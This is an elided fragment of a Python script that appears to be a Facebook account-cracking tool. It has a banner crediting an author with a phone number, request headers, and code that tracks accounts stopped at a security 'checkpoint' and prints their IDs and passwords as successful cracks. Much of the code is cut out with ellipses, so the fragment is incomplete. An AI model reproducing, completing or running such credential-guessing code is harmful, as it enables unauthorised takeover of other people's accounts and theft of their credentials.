...
\_______/  \______/        \_______|   \_/    \_______|\__|  \__|
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} Dj-EVAN               {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H} DJ CAYBER       {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+01971221653          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}FUCK YOU{N}    {H}  ║
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract CYBER ARMY')
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mCYBER-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
